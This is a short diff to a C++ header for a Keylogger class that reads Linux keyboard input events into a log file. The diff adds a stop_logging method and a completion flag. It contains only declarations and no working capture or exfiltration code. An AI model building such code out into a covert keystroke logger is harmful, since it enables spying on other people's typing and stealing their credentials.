@@ -18,6 +18,7 @@ public:
     Keylogger(std::string log_filename);
   
     bool start_logging();
+    bool stop_logging();
 private:
     void process_keys();
     std::string get_keyboard_path();
@@ -27,6 +28,8 @@ private:
     int m_keyboard_fd;
     FILE* m_fptr;
     struct input_event m_ev;
+
+    bool m_done; // make atomic?
 };
 
 #endif
